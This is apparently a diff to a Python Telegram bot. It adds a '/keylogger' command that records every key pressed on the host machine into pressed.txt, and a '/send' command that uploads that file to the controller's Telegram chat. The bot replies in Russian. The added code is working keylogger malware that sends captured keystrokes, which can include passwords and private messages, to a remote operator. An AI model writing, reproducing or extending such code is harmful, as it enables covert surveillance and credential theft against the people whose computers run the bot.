@@ -152,6 +152,47 @@ def commands(message):
         
 
         
+         elif message.text == '/keylogger':
+                bot.send_message(message.chat.id,'Кейлоггер вкл,что бы получить файл /send')
+                def on_press(key):
+                        try:
+                                print('alphanumeric key {0} pressed'.format(
+                                    key.char))
+                                item = open('pressed.txt','a+')
+                                item.write(key.char + '|next|')
+                                item.close
+                        except AttributeError:
+                                print('special key {0} pressed'.format(
+                                key))
+
+                def on_release(key):
+                        print('{0} released'.format(    
+                        key))
+                        if key == keyboard.Key.end:
+
+                                return False
+
+
+                with keyboard.Listener(
+                        on_press=on_press,
+                        on_release=on_release) as listener:
+                    listener.join()
+
+
+
+        elif message.text == '/send':
+                try:
+                       item = open('pressed.txt')
+                       bot.send_document(message.chat.id,item)
+                       item.close()
+                except:
+                        bot.send_message(message.chat.id,'ошибка')
+                        
+                               
+        
+        
+        
+        
 def get_record(message):
         global record
         record = message.text
